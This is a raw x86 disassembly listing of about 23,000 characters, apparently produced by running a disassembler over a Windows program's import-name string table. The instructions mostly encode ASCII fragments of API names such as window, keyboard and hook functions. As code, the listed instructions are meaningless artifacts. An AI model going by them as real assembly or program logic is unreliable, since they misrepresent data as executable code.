  413b96:	ins    BYTE PTR es:[edi],dx
  413b97:	push   edx
  413b98:	arpl   WORD PTR gs:[eax+eax*1-0x6c],si
  413b9d:	add    dl,BYTE PTR [edx+esi*2+0x61]
  413ba1:	outs   dx,BYTE PTR ds:[esi]
  413ba2:	jae    0x413c10
  413ba4:	popa   
  413ba5:	je     0x413c0c
  413ba7:	inc    ecx
  413ba8:	arpl   WORD PTR [ebx+0x65],sp
  413bab:	ins    BYTE PTR es:[edi],dx
  413bac:	gs jb  0x413c10
  413baf:	je     0x413c20
  413bb1:	jb     0x413c0a
  413bb3:	add    BYTE PTR [esi],bh
  413bb5:	add    BYTE PTR [ebx+0x68],al
  413bb8:	imul   ebp,DWORD PTR [esp+eiz*2+0x57],0x6f646e69
  413bc0:	ja     0x413c08
  413bc2:	jb     0x413c33
  413bc4:	ins    DWORD PTR es:[edi],dx
  413bc5:	push   eax
  413bc6:	outs   dx,DWORD PTR ds:[esi]
  413bc7:	imul   ebp,DWORD PTR [esi+0x74],0x28a0000
  413bce:	push   esp
  413bcf:	imul   ebp,DWORD PTR [ebp+eiz*2+0x57],0x6f646e69
  413bd7:	ja     0x413c4c
  413bd9:	add    BYTE PTR [esi+0x616f4c01],dh
  413bdf:	fs dec ebp
  413be1:	outs   dx,BYTE PTR gs:[esi]
  413be3:	jne    0x413c26
  413be5:	add    al,al
  413be7:	add    BYTE PTR [ebp+0x6e],al
  413bea:	popa   
  413beb:	bound  ebp,QWORD PTR [ebp+eiz*2+0x53]
  413bef:	arpl   WORD PTR [edx+0x6f],si
  413bf2:	ins    BYTE PTR es:[edi],dx
  413bf3:	ins    BYTE PTR es:[edi],dx
  413bf4:	inc    edx
  413bf5:	popa   
  413bf6:	jb     0x413bf8
  413bf8:	xor    al,BYTE PTR [ecx]
  413bfa:	inc    edi
  413bfb:	gs je  0x413c4b
  413bfe:	outs   dx,BYTE PTR gs:[esi]
  413c00:	jne    0x413c4b
  413c02:	je     0x413c69
  413c04:	ins    DWORD PTR es:[edi],dx
  413c05:	inc    ebx
  413c06:	outs   dx,DWORD PTR ds:[esi]
  413c07:	jne    0x413c77
  413c09:	je     0x413c0b
  413c0b:	add    cl,ah
  413c0d:	add    BYTE PTR [esi+0x69],al
  413c10:	outs   dx,BYTE PTR ds:[esi]
  413c11:	fs push edi
  413c13:	imul   ebp,DWORD PTR [esi+0x64],0x41776f
  413c1a:	rol    BYTE PTR [ecx],1
  413c1c:	dec    ebp
  413c1d:	gs jae 0x413c93
  413c20:	popa   
  413c21:	addr16 gs inc edx
  413c24:	outs   dx,DWORD PTR ds:[esi]
  413c25:	js     0x413c6c
  413c27:	js     0x413c80
  413c29:	add    BYTE PTR [eax+0x536e4901],al
  413c2f:	outs   dx,BYTE PTR gs:[esi]
  413c31:	fs dec ebp
  413c33:	gs jae 0x413ca9
  413c36:	popa   
  413c37:	addr16 gs add al,bl
  413c3b:	add    DWORD PTR [ebp+0x6f],ecx
  413c3e:	outs   dx,BYTE PTR ds:[esi]
  413c3f:	imul   esi,DWORD PTR [edi+ebp*2+0x72],0x6d6f7246
  413c47:	push   eax
  413c48:	outs   dx,DWORD PTR ds:[esi]
  413c49:	imul   ebp,DWORD PTR [esi+0x74],0x1680000
  413c50:	inc    edi
  413c51:	gs je  0x413cab
  413c54:	imul   ebp,DWORD PTR [esi+0x64],0x7d00776f
  413c5b:	add    dl,BYTE PTR [ebx+0x68]
  413c5e:	outs   dx,DWORD PTR ds:[esi]
  413c5f:	ja     0x413cb4
  413c61:	arpl   WORD PTR [edx+0x6f],si
  413c64:	ins    BYTE PTR es:[edi],dx
  413c65:	ins    BYTE PTR es:[edi],dx
  413c66:	inc    edx
  413c67:	popa   
  413c68:	jb     0x413c6a
  413c6a:	mov    cl,0x1
  413c6c:	dec    esp
  413c6d:	outs   dx,DWORD PTR ds:[esi]
  413c6e:	popa   
  413c6f:	fs dec ecx
  413c71:	ins    DWORD PTR es:[edi],dx
  413c72:	popa   
  413c73:	addr16 gs inc ecx
  413c76:	add    BYTE PTR [eax],al
  413c78:	cdq    
  413c79:	add    BYTE PTR [ecx+ebp*2+0x61],al
  413c7d:	ins    BYTE PTR es:[edi],dx
  413c7e:	outs   dx,DWORD PTR ds:[esi]
  413c7f:	addr16 inc edx
  413c81:	outs   dx,DWORD PTR ds:[esi]
  413c82:	js     0x413ccd
  413c84:	outs   dx,BYTE PTR ds:[esi]
  413c85:	imul   esi,DWORD PTR fs:[edx+0x65],0x61507463
  413c8d:	jb     0x413cf0
  413c8f:	ins    DWORD PTR es:[edi],dx
  413c90:	inc    ecx
  413c91:	add    ch,al
  413c93:	add    DWORD PTR [ebp+0x61],ecx
  413c96:	jo     0x413cee
  413c98:	imul   esi,DWORD PTR [edx+0x74],0x4b6c6175
  413c9f:	gs jns 0x413ce3
  413ca2:	add    BYTE PTR [eax],al
  413ca4:	sbb    BYTE PTR [edx],al
  413ca6:	push   edx
  413ca7:	gs ins DWORD PTR es:[edi],dx
  413ca9:	outs   dx,DWORD PTR ds:[esi]
  413caa:	jbe    0x413d11
  413cac:	push   eax
  413cad:	jb     0x413d1e
  413caf:	jo     0x413d08
  413cb1:	add    BYTE PTR [ecx+eax*1+0x47],ah
  413cb5:	gs je  0x413d0d
  413cb8:	jo     0x413d1e
  413cba:	popa   
  413cbb:	je     0x413d22
  413cbd:	push   edx
  413cbe:	outs   dx,BYTE PTR ds:[si]
  413cc0:	add    BYTE PTR [eax],al
  413cc2:	add    al,BYTE PTR [edx]
  413cc4:	push   edx
  413cc5:	imul   esi,DWORD PTR gs:[bp+di+0x74],0x6c437265
  413cce:	popa   
  413ccf:	jae    0x413d44
  413cd1:	inc    ecx
  413cd2:	add    BYTE PTR [eax],al
  413cd4:	add    dl,BYTE PTR ds:[ebx+0x65]
  413cd8:	je     0x413d1e
  413cda:	ins    BYTE PTR es:[edi],dx
  413cdb:	addr16 dec ecx
  413cdd:	je     0x413d44
  413cdf:	ins    DWORD PTR es:[edi],dx
  413ce0:	push   esp
  413ce1:	gs js  0x413d58
  413ce4:	inc    ecx
  413ce5:	add    BYTE PTR [ebp+0x61724400],dh
  413ceb:	ja     0x413d3a
  413ced:	outs   dx,BYTE PTR gs:[esi]
  413cef:	jne    0x413d33
  413cf1:	popa   
  413cf2:	jb     0x413cf4
  413cf4:	sub    eax,DWORD PTR [ecx]
  413cf6:	inc    edi
  413cf7:	gs je  0x413d47
  413cfa:	outs   dx,BYTE PTR gs:[esi]
  413cfc:	jne    0x413cfe
  413cfe:	repnz add DWORD PTR [eax+0x6f],edx
  413d02:	jae    0x413d78
  413d04:	dec    ebp
  413d05:	gs jae 0x413d7b
  413d08:	popa   
  413d09:	addr16 gs push edi
  413d0c:	add    BYTE PTR [eax],al
  413d0e:	push   cs
  413d0f:	add    DWORD PTR [edi+0x65],eax
  413d12:	je     0x413d58
  413d14:	ins    BYTE PTR es:[edi],dx
  413d15:	addr16 inc ebx
  413d17:	je     0x413d8b
  413d19:	ins    BYTE PTR es:[edi],dx
  413d1a:	dec    ecx
  413d1b:	inc    esp
  413d1c:	add    BYTE PTR [eax],al
  413d1e:	mov    cl,0x2
  413d20:	push   esi
  413d21:	imul   ecx,DWORD PTR [ebx+0x65],0x79
  413d25:	push   ebx
  413d26:	arpl   WORD PTR [ecx+0x6e],sp
  413d29:	push   edi
  413d2a:	add    BYTE PTR [eax],al
  413d2c:	sbb    BYTE PTR [ecx],al
  413d2e:	inc    edi
  413d2f:	gs je  0x413d7b
  413d32:	arpl   WORD PTR [edi+0x6e],bp
  413d35:	dec    ecx
  413d36:	outs   dx,BYTE PTR ds:[esi]
  413d37:	outs   dx,WORD PTR ds:[esi]
  413d39:	add    cl,cl
  413d3b:	add    DWORD PTR [ebp+0x61],ecx
  413d3e:	jo     0x413d97
  413d40:	imul   ebp,DWORD PTR [esi+0x64],0x6f50776f
  413d47:	imul   ebp,DWORD PTR [esi+0x74],0x2d0073
  413d4e:	inc    ebx
  413d4f:	push   0x654e7261
  413d54:	js     0x413dca
  413d56:	push   edi
  413d57:	add    BYTE PTR [ecx],ch
  413d59:	add    dl,BYTE PTR [ebx+0x65]
  413d5c:	outs   dx,BYTE PTR ds:[esi]
  413d5d:	fs dec ebp
  413d5f:	gs jae 0x413dd5
  413d62:	popa   
  413d63:	addr16 gs push esp
  413d66:	imul   ebp,DWORD PTR [ebp+0x65],0x4174756f
  413d6d:	add    BYTE PTR [eax],ch
  413d6f:	add    BYTE PTR [ebx+0x68],al
  413d72:	popa   
  413d73:	jb     0x413dc1
  413d75:	outs   dx,DWORD PTR ds:[esi]
  413d76:	ja     0x413ddd
  413d78:	jb     0x413dbc
  413d7a:	jne    0x413de2
  413d7c:	push   di
  413d7e:	add    BYTE PTR [eax],al
  413d80:	ins    DWORD PTR es:[edi],dx
  413d81:	add    DWORD PTR [edi+0x65],eax
  413d84:	je     0x413ddd
  413d86:	imul   ebp,DWORD PTR [esi+0x64],0x6f4c776f
  413d8d:	outs   dx,BYTE PTR ds:[esi]
  413d8e:	addr16 push edi
  413d90:	add    BYTE PTR [eax],al
  413d92:	mov    bh,0x2
  413d94:	push   edi
  413d95:	popa   
  413d96:	imul   esi,DWORD PTR [esi+eax*2+0x6f],0x706e4972
  413d9e:	jne    0x413e14
  413da0:	dec    ecx
  413da1:	fs ins BYTE PTR es:[edi],dx
  413da3:	add    BYTE PTR gs:[eax],al
  413da6:	mov    DWORD PTR [ecx],0x5670614d
  413dac:	imul   esi,DWORD PTR [edx+0x74],0x4b6c6175
  413db3:	gs jns 0x413dfb
  413db6:	js     0x413e0f
  413db8:	add    BYTE PTR [eax],al
  413dba:	cmp    eax,0x65684300
  413dbf:	arpl   WORD PTR [ebx+0x52],bp
  413dc2:	popa   
  413dc3:	imul   ebp,DWORD PTR fs:[edi+0x42],0x6f747475
  413dcb:	outs   dx,BYTE PTR ds:[esi]
  413dcc:	add    BYTE PTR [eax],al
  413dce:	add    eax,0x6c6c4100
  413dd3:	outs   dx,DWORD PTR ds:[esi]
  413dd4:	ja     0x413e29
  413dd6:	gs je  0x413e1f
  413dd9:	outs   dx,DWORD PTR ds:[esi]
  413dda:	jb     0x413e41
  413ddc:	addr16 jb 0x413e4e
  413ddf:	jne    0x413e4f
  413de1:	fs push edi
  413de3:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  413dea:	into   
  413deb:	add    DWORD PTR [ebp+0x65],ecx
  413dee:	jae    0x413e63
  413df0:	popa   
  413df1:	addr16 gs inc edx
  413df4:	outs   dx,DWORD PTR ds:[esi]
  413df5:	js     0x413e38
  413df7:	add    BYTE PTR [edx],bh
  413df9:	add    DWORD PTR [edi+0x65],eax
  413dfc:	je     0x413e4b
  413dfe:	gs jae 0x413e74
  413e01:	popa   
  413e02:	addr16 gs inc ecx
  413e05:	add    BYTE PTR [edx+0x2],cl
  413e08:	push   ebx
  413e09:	gs je  0x413e59
  413e0c:	outs   dx,BYTE PTR gs:[esi]
  413e0e:	jne    0x413e54
  413e10:	gs popaw 
  413e13:	jne    0x413e81
  413e15:	je     0x413e60
  413e17:	je     0x413e7e
  413e19:	ins    DWORD PTR es:[edi],dx
  413e1a:	add    BYTE PTR [eax],al
  413e1c:	aad    0x1
  413e1e:	dec    ebp
  413e1f:	gs jae 0x413e95
  413e22:	popa   
  413e23:	addr16 gs inc edx
  413e26:	outs   dx,DWORD PTR ds:[esi]
  413e27:	js     0x413e80
  413e29:	add    BYTE PTR [ecx],bh
  413e2b:	add    DWORD PTR [edi+0x65],eax
  413e2e:	je     0x413e7d
  413e30:	outs   dx,BYTE PTR gs:[esi]
  413e32:	jne    0x413e87
  413e34:	je     0x413ea8
  413e36:	imul   ebp,DWORD PTR [esi+0x67],0xb9000057
  413e3d:	add    DWORD PTR [edi+ebp*2+0x61],ecx
  413e41:	fs dec ebp
  413e43:	outs   dx,BYTE PTR gs:[esi]
  413e45:	jne    0x413e9e
  413e47:	add    BYTE PTR [ecx+eax*1+0x47],bl
  413e4b:	gs je  0x413ea1
  413e4e:	jns    0x413ec3
  413e50:	je     0x413eb7
  413e52:	ins    DWORD PTR es:[edi],dx
  413e53:	dec    ebp
  413e54:	gs je  0x413ec9
  413e57:	imul   esp,DWORD PTR [ebx+0x73],0x2260000
  413e5e:	push   ebx
  413e5f:	outs   dx,BYTE PTR gs:[esi]
  413e61:	fs dec ebp
  413e63:	gs jae 0x413ed9
  413e66:	popa   
  413e67:	addr16 gs inc ecx
  413e6a:	add    BYTE PTR [eax],al
  413e6c:	aaa    
  413e6d:	add    DWORD PTR [edi+0x65],eax
  413e70:	je     0x413ebf
  413e72:	outs   dx,BYTE PTR gs:[esi]
  413e74:	jne    0x413ec9
  413e76:	je     0x413ed9
  413e78:	je     0x413edf
  413e7a:	add    BYTE PTR [eax],al
  413e7c:	mov    bl,0x0
  413e7e:	inc    esp
  413e7f:	jb     0x413ee2
  413e81:	ja     0x413ecc
  413e83:	arpl   WORD PTR [edi+0x6e],bp
  413e86:	add    BYTE PTR [eax],al
  413e88:	xchg   ebp,eax
  413e89:	add    BYTE PTR [ebp+eiz*2+0x73],al
  413e8d:	je     0x413f01
  413e8f:	outs   dx,DWORD PTR ds:[esi]
  413e90:	jns    0x413ed5
  413e92:	jne    0x413f06
  413e94:	jae    0x413f05
  413e96:	jb     0x413e98
  413e98:	add    al,BYTE PTR [eax]
  413e9a:	inc    ecx
  413e9b:	fs push 0x75
  413e9e:	jae    0x413f14
  413ea0:	push   edi
  413ea1:	imul   ebp,DWORD PTR [esi+0x64],0x6552776f
  413ea8:	arpl   WORD PTR [eax+eax*1+0x0],si
  413eac:	pop    ecx
  413ead:	add    DWORD PTR [edi+0x65],eax
  413eb0:	je     0x413f05
  413eb2:	jns    0x413f27
  413eb4:	inc    ebx
  413eb5:	outs   dx,DWORD PTR ds:[esi]
  413eb6:	ins    BYTE PTR es:[edi],dx
  413eb7:	outs   dx,DWORD PTR ds:[esi]
  413eb8:	jb     0x413eba
  413eba:	jle    0x413ebd
  413ebc:	dec    eax
  413ebd:	imul   ebp,DWORD PTR [ecx+ebp*2+0x74],0x6e654d65
  413ec5:	jne    0x413f10
  413ec7:	je     0x413f2e
  413ec9:	ins    DWORD PTR es:[edi],dx
  413eca:	add    BYTE PTR [eax],al
  413ecc:	or     DWORD PTR [eax],eax
  413ece:	inc    ecx
  413ecf:	jo     0x413f41
  413ed1:	outs   dx,BYTE PTR gs:[esi]
  413ed3:	fs dec ebp
  413ed5:	outs   dx,BYTE PTR gs:[esi]
  413ed7:	jne    0x413f30
  413ed9:	add    BYTE PTR [eax+eax*1],bh
  413edc:	inc    ebx
  413edd:	push   0x4d6b6365
  413ee2:	outs   dx,BYTE PTR gs:[esi]
  413ee4:	jne    0x413f38
  413ee6:	popa   
  413ee7:	imul   ebp,DWORD PTR fs:[edi+0x49],0x6d6574
  413eef:	add    BYTE PTR [ecx+eax*1+0x64616f4c],bh
  413ef6:	push   ebx
  413ef7:	je     0x413f6b
  413ef9:	imul   ebp,DWORD PTR [esi+0x67],0x21f0057
  413f00:	push   ebx
  413f01:	arpl   WORD PTR [edx+0x6f],si
  413f04:	ins    BYTE PTR es:[edi],dx
  413f05:	ins    BYTE PTR es:[edi],dx
  413f06:	push   edi
  413f07:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  413f0e:	xor    DWORD PTR [eax],eax
  413f10:	inc    ebx
  413f11:	push   0x72507261
  413f16:	gs jbe 0x413f70
  413f19:	add    BYTE PTR [edi+0x2],bl
  413f1c:	push   ebx
  413f1d:	gs je  0x413f73
  413f20:	jns    0x413f95
  413f22:	inc    ebx
  413f23:	outs   dx,DWORD PTR ds:[esi]
  413f24:	ins    BYTE PTR es:[edi],dx
  413f25:	outs   dx,DWORD PTR ds:[esi]
  413f26:	jb     0x413f9b
  413f28:	add    BYTE PTR [eax],al
  413f2a:	sgdtd  [edi+0x65]
  413f2e:	je     0x413f74
  413f30:	ins    BYTE PTR es:[edi],dx
  413f31:	addr16 dec ecx
  413f33:	je     0x413f9a
  413f35:	ins    DWORD PTR es:[edi],dx
  413f36:	add    BYTE PTR [eax],al
  413f38:	dec    esp
  413f39:	add    dl,BYTE PTR [ebx+0x65]
  413f3c:	je     0x413f8b
  413f3e:	outs   dx,BYTE PTR gs:[esi]
  413f40:	jne    0x413f8b
  413f42:	je     0x413fa9
  413f44:	ins    DWORD PTR es:[edi],dx
  413f45:	inc    edx
  413f46:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0x7370
  413f4e:	or     al,0x1
  413f50:	inc    edi
  413f51:	gs je  0x413f98
  413f54:	gs jae 0x413fc2
  413f57:	je     0x413fc8
  413f59:	jo     0x413fb2
  413f5b:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  413f62:	inc    ebp
  413f63:	add    DWORD PTR [edi+0x65],eax
  413f66:	je     0x413fb8
  413f68:	popa   
  413f69:	jb     0x413fd0
  413f6b:	outs   dx,BYTE PTR ds:[esi]
  413f6c:	je     0x413f6e
  413f6e:	mov    BYTE PTR [eax],0x45
  413f71:	outs   dx,BYTE PTR ds:[esi]
  413f72:	fs push esp
  413f74:	popa   
  413f75:	jae    0x413fe2
  413f77:	add    BYTE PTR [eax+0x0],ah
  413f7a:	inc    ebx
  413f7b:	jb     0x413fe2
  413f7d:	popa   
  413f7e:	je     0x413fe5
  413f80:	dec    ebp
  413f81:	outs   dx,BYTE PTR gs:[esi]
  413f83:	jne    0x413f85
  413f85:	add    bl,dh
  413f87:	add    BYTE PTR [edi+0x65],al
  413f8a:	je     0x413fcf
  413f8c:	popa   
  413f8d:	jb     0x413ff4
  413f8f:	je     0x413fe1
  413f91:	outs   dx,DWORD PTR ds:[esi]
  413f92:	jae    0x413f94
  413f94:	sub    eax,DWORD PTR [edx]
  413f96:	push   ebx
  413f97:	outs   dx,BYTE PTR gs:[esi]
  413f99:	fs dec ebp
  413f9b:	gs jae 0x414011
  413f9e:	popa   
  413f9f:	addr16 gs push edi
  413fa2:	add    BYTE PTR [eax],al
  413fa4:	test   DWORD PTR [ecx],eax
  413fa6:	dec    ecx
  413fa7:	outs   dx,BYTE PTR ds:[esi]
  413fa8:	jae    0x41400f
  413faa:	jb     0x414020
  413fac:	dec    ebp
  413fad:	outs   dx,BYTE PTR gs:[esi]
  413faf:	jne    0x413ffa
  413fb1:	je     0x414018
  413fb3:	ins    DWORD PTR es:[edi],dx
  413fb4:	push   edi
  413fb5:	add    BYTE PTR [ecx+0x0],ah
  413fb8:	inc    ebx
  413fb9:	jb     0x414020
  413fbb:	popa   
  413fbc:	je     0x414023
  413fbe:	push   eax
  413fbf:	outs   dx,DWORD PTR ds:[esi]
  413fc0:	jo     0x414037
  413fc2:	jo     0x414011
  413fc4:	outs   dx,BYTE PTR gs:[esi]
  413fc6:	jne    0x413fc8
  413fc8:	inc    eax
  413fc9:	add    DWORD PTR [edi+0x65],eax
  413fcc:	je     0x41401b
  413fce:	outs   dx,DWORD PTR ds:[esi]
  413fcf:	outs   dx,BYTE PTR ds:[esi]
  413fd0:	imul   esi,DWORD PTR [edi+ebp*2+0x72],0x6f666e49
  413fd8:	push   edi
  413fd9:	add    al,cl
  413fdb:	add    DWORD PTR [ebp+0x61],ecx
  413fde:	jo     0x414036
  413fe0:	imul   esi,DWORD PTR [edx+0x74],0x4b6c6175
  413fe7:	gs jns 0x414041
  413fea:	add    BYTE PTR [eax],al
  413fec:	out    0x0,eax
  413fee:	inc    esi
  413fef:	jb     0x414052
  413ff1:	ins    DWORD PTR es:[edi],dx
  413ff2:	gs push edx
  413ff4:	arpl   WORD PTR gs:[eax+eax*1-0x41],si
  413ff9:	add    BYTE PTR [ebp+0x6e],al
  413ffc:	popa   
  413ffd:	bound  ebp,QWORD PTR [ebp+eiz*2+0x4d]
  414001:	outs   dx,BYTE PTR gs:[esi]
  414003:	jne    0x41404e
  414005:	je     0x41406c
  414007:	ins    DWORD PTR es:[edi],dx
  414008:	add    BYTE PTR [eax],al
  41400a:	fwait
  41400b:	add    dl,BYTE PTR [ebp+0x6e]
  41400e:	ins    BYTE PTR es:[edi],dx
  41400f:	outs   dx,DWORD PTR ds:[esi]
  414010:	popa   
  414011:	fs dec ebx
  414013:	gs jns 0x414078
  414016:	outs   dx,DWORD PTR ds:[esi]
  414017:	popa   
  414018:	jb     0x41407e
  41401a:	dec    esp
  41401b:	popa   
  41401c:	jns    0x41408d
  41401e:	jne    0x414094
  414020:	add    BYTE PTR [eax],al
  414022:	mov    esp,0x6e695702
  414027:	outs   dx,DWORD PTR fs:[esi]
  414029:	ja     0x414071
  41402b:	jb     0x41409c
  41402d:	ins    DWORD PTR es:[edi],dx
  41402e:	push   eax
  41402f:	outs   dx,DWORD PTR ds:[esi]
  414030:	imul   ebp,DWORD PTR [esi+0x74],0x4400ab00
  414037:	jb     0x41409a
  414039:	ja     0x41407c
  41403b:	outs   dx,BYTE PTR ds:[esi]
  41403c:	imul   ebp,DWORD PTR [ebp+0x61],0x52646574
  414043:	arpl   WORD PTR gs:[ebx+esi*2+0x0],si
  414048:	and    BYTE PTR [edx],al
  41404a:	push   ebx
  41404b:	arpl   WORD PTR [edx+0x6f],si
  41404e:	ins    BYTE PTR es:[edi],dx
  41404f:	ins    BYTE PTR es:[edi],dx
  414050:	push   edi
  414051:	imul   ebp,DWORD PTR [esi+0x64],0x7845776f
  414058:	add    BYTE PTR [eax],al
  41405a:	pop    eax
  41405b:	add    dl,BYTE PTR [ebx+0x65]
  41405e:	je     0x4140b2
  414060:	arpl   WORD PTR gs:[eax+eax*1+0x3d],si
  414065:	add    dl,BYTE PTR [ebx+0x65]
  414068:	je     0x4140ae
  41406a:	ins    BYTE PTR es:[edi],dx
  41406b:	addr16 dec ecx
  41406d:	je     0x4140d4
  41406f:	ins    DWORD PTR es:[edi],dx
  414070:	dec    ecx
  414071:	outs   dx,BYTE PTR ds:[esi]
  414072:	je     0x414074
  414074:	or     eax,0x67654200
  414079:	imul   ebp,DWORD PTR [esi+0x50],0x746e6961
  414080:	add    BYTE PTR [eax],al
  414082:	pop    ebp
  414083:	add    BYTE PTR [ebx+0x72],al
  414086:	gs popa 
  414088:	je     0x4140ef
  41408a:	dec    ecx
  41408b:	arpl   WORD PTR [edi+0x6e],bp
  41408e:	dec    ecx
  41408f:	outs   dx,BYTE PTR ds:[esi]
  414090:	imul   esi,DWORD PTR fs:[edx+0x65],0x7463
  414098:	dec    esi
  414099:	add    dl,BYTE PTR [ebx+0x65]
  41409c:	je     0x4140eb
  41409e:	outs   dx,BYTE PTR gs:[esi]
  4140a0:	jne    0x4140eb
  4140a2:	je     0x414109
  4140a4:	ins    DWORD PTR es:[edi],dx
  4140a5:	dec    ecx
  4140a6:	outs   dx,BYTE PTR ds:[esi]
  4140a7:	outs   dx,WORD PTR ds:[esi]
  4140a9:	push   edi
  4140aa:	add    BYTE PTR [eax],al
  4140ac:	pop    edx
  4140ad:	add    dl,BYTE PTR [ebx+0x65]
  4140b0:	je     0x414105
  4140b2:	arpl   WORD PTR [edx+0x6f],si
  4140b5:	ins    BYTE PTR es:[edi],dx
  4140b6:	ins    BYTE PTR es:[edi],dx
  4140b7:	dec    ecx
  4140b8:	outs   dx,BYTE PTR ds:[esi]
  4140b9:	outs   dx,WORD PTR ds:[esi]
  4140bb:	add    BYTE PTR [edx],dh
  4140bd:	add    BYTE PTR [ebx+0x68],al
  4140c0:	popa   
  4140c1:	jb     0x414117
  4140c3:	outs   dx,DWORD PTR ds:[esi]
  4140c4:	dec    edi
  4140c5:	gs ins DWORD PTR es:[edi],dx
  4140c7:	inc    ecx
  4140c8:	add    BYTE PTR [eax],al
  4140ca:	sub    eax,0x6e655302
  4140cf:	fs dec esi
  4140d1:	outs   dx,DWORD PTR ds:[esi]
  4140d2:	je     0x41413d
  4140d4:	data16 jns 0x414124
  4140d7:	gs jae 0x41414d
  4140da:	popa   
  4140db:	addr16 gs push edi
  4140de:	add    BYTE PTR [eax],al
  4140e0:	sti    
  4140e1:	add    BYTE PTR [edi+0x65],al
  4140e4:	je     0x414129
  4140e6:	ins    BYTE PTR es:[edi],dx
  4140e7:	popa   
  4140e8:	jae    0x41415d
  4140ea:	dec    esi
  4140eb:	popa   
  4140ec:	ins    DWORD PTR es:[edi],dx
  4140ed:	gs push edi
  4140ef:	add    BYTE PTR [ebx+0x61725402],dl
  4140f5:	outs   dx,BYTE PTR ds:[esi]
  4140f6:	jae    0x414164
  4140f8:	popa   
  4140f9:	je     0x414160
  4140fb:	inc    ecx
  4140fc:	arpl   WORD PTR [ebx+0x65],sp
  4140ff:	ins    BYTE PTR es:[edi],dx
  414100:	gs jb  0x414164
  414103:	je     0x414174
  414105:	jb     0x414148
  414107:	add    BYTE PTR [ebx+0x2],bh
  41410a:	push   ebx
  41410b:	push   0x7543776f
  414110:	jb     0x414185
  414112:	outs   dx,DWORD PTR ds:[esi]
  414113:	jb     0x414115
  414115:	add    BYTE PTR [ebx+0x2],dh
  414118:	push   ebx
  414119:	gs je  0x414173
  41411c:	imul   ebp,DWORD PTR [esi+0x64],0x6554776f
  414123:	js     0x414199
  414125:	inc    ecx
  414126:	add    BYTE PTR [eax],al
  414128:	add    BYTE PTR es:[ebx+0x68],al
  41412c:	popa   
  41412d:	jb     0x41417b
  41412f:	outs   dx,DWORD PTR ds:[esi]
  414130:	ja     0x414197
  414132:	jb     0x414175
  414134:	add    BYTE PTR [eax],al
  414136:	xchg   BYTE PTR [ecx],al
  414138:	dec    ecx
  414139:	outs   dx,BYTE PTR ds:[esi]
  41413a:	jae    0x4141a1
  41413c:	jb     0x4141b2
  41413e:	dec    ebp
  41413f:	outs   dx,BYTE PTR gs:[esi]
  414141:	jne    0x41419a
  414143:	add    BYTE PTR [eax],cl
  414145:	add    BYTE PTR [ecx+0x70],al
  414148:	jo     0x4141af
  41414a:	outs   dx,BYTE PTR ds:[esi]
  41414b:	fs dec ebp
  41414d:	outs   dx,BYTE PTR gs:[esi]
  41414f:	jne    0x414192
  414151:	add    BYTE PTR [edx+0x1],ch
  414154:	inc    edi
  414155:	gs je  0x4141af
  414158:	imul   ebp,DWORD PTR [esi+0x64],0x4344776f
  41415f:	add    BYTE PTR [ecx+0x2],bl
  414162:	push   ebx
  414163:	gs je  0x4141b8
  414166:	arpl   WORD PTR gs:[ebp+eax*2+0x6d],si
  41416b:	jo     0x4141e1
  41416d:	jns    0x41416f
  41416f:	add    BYTE PTR [edx+0x1],bl
  414172:	inc    edi
  414173:	gs je  0x4141c9
  414176:	jns    0x4141eb
  414178:	inc    ebx
  414179:	outs   dx,DWORD PTR ds:[esi]
  41417a:	ins    BYTE PTR es:[edi],dx
  41417b:	outs   dx,DWORD PTR ds:[esi]
  41417c:	jb     0x4141c0
  41417e:	jb     0x4141f5
  414180:	jae    0x4141ea
  414182:	add    BYTE PTR [eax],al
  414184:	jg     0x414188
  414186:	push   ebx
  414187:	push   0x6957776f
  41418c:	outs   dx,BYTE PTR ds:[esi]
  41418d:	outs   dx,DWORD PTR fs:[esi]
  41418f:	ja     0x414191
  414191:	add    BYTE PTR [eax+eax*1],ah
  414194:	inc    ebx
  414195:	push   0x65676e61
  41419a:	dec    ebp
  41419b:	outs   dx,BYTE PTR gs:[esi]
  41419d:	jne    0x4141f6
  41419f:	add    al,ah
  4141a1:	add    DWORD PTR [edi+0x65],ecx
  4141a4:	ins    DWORD PTR es:[edi],dx
  4141a5:	push   esp
  4141a6:	outs   dx,DWORD PTR ds:[esi]
  4141a7:	inc    ebx
  4141a8:	push   0x417261
  4141ad:	add    BYTE PTR [edi+0x43734901],cl
  4141b3:	push   0x6c417261
  4141b8:	jo     0x414222
  4141ba:	popa   
  4141bb:	push   edi
  4141bc:	add    BYTE PTR [eax],al
  4141be:	xchg   BYTE PTR [edx],al
  4141c0:	push   ebx
  4141c1:	jns    0x414236
  4141c3:	je     0x41422a
  4141c5:	ins    DWORD PTR es:[edi],dx
  4141c6:	push   eax
  4141c7:	popa   
  4141c8:	jb     0x41422b
  4141ca:	ins    DWORD PTR es:[edi],dx
  4141cb:	gs je  0x414233
  4141ce:	jb     0x414243
  4141d0:	dec    ecx
  4141d1:	outs   dx,BYTE PTR ds:[esi]
  4141d2:	outs   dx,WORD PTR ds:[esi]
  4141d4:	push   edi
  4141d5:	add    BYTE PTR ds:0x67655202,al
  4141db:	imul   esi,DWORD PTR [ebx+0x74],0x6c437265
  4141e2:	popa   
  4141e3:	jae    0x414258
  4141e5:	push   edi
  4141e6:	add    BYTE PTR [eax],al
  4141e8:	add    BYTE PTR [edx],0x53
  4141eb:	push   0x6957776f
  4141f0:	outs   dx,BYTE PTR ds:[esi]
  4141f1:	outs   dx,DWORD PTR fs:[esi]
  4141f3:	ja     0x414236
  4141f5:	jae    0x414270
  4141f7:	outs   dx,BYTE PTR ds:[esi]
  4141f8:	arpl   WORD PTR [eax],ax
  4141fa:	mov    edi,0x70737702
  4141ff:	jb     0x41426a
  414201:	outs   dx,BYTE PTR ds:[esi]
  414202:	je     0x41426a
  414204:	inc    ecx
  414205:	add    BYTE PTR [esi+0x2],ch
  414208:	push   ebx
  414209:	gs je  0x414263
  41420c:	imul   ebp,DWORD PTR [esi+0x64],0x6f4c776f
  414213:	outs   dx,BYTE PTR ds:[esi]
  414214:	addr16 push edi
  414216:	add    BYTE PTR [eax],al
  414218:	test   BYTE PTR [edx],al
  41421a:	push   ebx
  41421b:	ja     0x414286
  41421d:	je     0x414282
  41421f:	push   0x68546f54
  414224:	imul   esi,DWORD PTR [ebx+0x57],0x6f646e69
  41422b:	ja     0x41422d
  41422d:	add    al,al
  41422f:	add    dh,BYTE PTR [edi+0x73]
  414232:	jo     0x4142a6
